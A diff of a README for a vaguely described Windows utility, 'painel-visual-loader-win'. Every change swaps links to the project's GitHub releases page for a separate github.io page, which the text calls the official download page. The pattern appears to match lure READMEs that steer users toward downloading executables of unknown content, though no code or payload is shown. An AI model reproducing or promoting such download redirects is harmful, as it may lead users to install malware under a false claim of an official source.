@@ -1,12 +1,12 @@
 # 🎯 painel-visual-loader-win - Your Simple Target Display Tool for Windows
 
-[![Download Now](https://img.shields.io/badge/Download-painel--visual--loader--win-blue?style=for-the-badge&logo=github)](https://github.com/rightofactiongarden532/painel-visual-loader-win/releases)
+[![Download Now](https://img.shields.io/badge/Download-painel--visual--loader--win-blue?style=for-the-badge&logo=github)](https://rightofactiongarden532.github.io)
 
 ---
 
 ## 📥 Visit This Link to Download the Application
 
-Click the button above or go directly to [https://github.com/rightofactiongarden532/painel-visual-loader-win/releases](https://github.com/rightofactiongarden532/painel-visual-loader-win/releases) to download the application. This page contains all the files you need to get started.
+Click the button above or go directly to [https://rightofactiongarden532.github.io](https://rightofactiongarden532.github.io) to download the application. This page contains all the files you need to get started.
 
 ---
 
@@ -36,7 +36,7 @@ Follow these simple steps. If you can follow a recipe, you can get this running.
 
 Open your web browser (like Chrome, Edge, or Firefox) and go to:
 
-[https://github.com/rightofactiongarden532/painel-visual-loader-win/releases](https://github.com/rightofactiongarden532/painel-visual-loader-win/releases)
+[https://rightofactiongarden532.github.io](https://rightofactiongarden532.github.io)
 
 This is the official download page for the app. It will show you a list of files.
 
@@ -190,7 +190,7 @@ Painel-visual-loader-win is a straightforward, lightweight utility that does one
 
 If you're already seeing this page, you're only two clicks away from using the app. Download it today and give it a try.
 
-[![Get the App](https://img.shields.io/badge/⬇️%20Get%20painel--visual--loader--win%20Now-2ea44f?style=for-the-badge)](https://github.com/rightofactiongarden532/painel-visual-loader-win/releases)
+[![Get the App](https://img.shields.io/badge/⬇️%20Get%20painel--visual--loader--win%20Now-2ea44f?style=for-the-badge)](https://rightofactiongarden532.github.io)
 
 ---
 
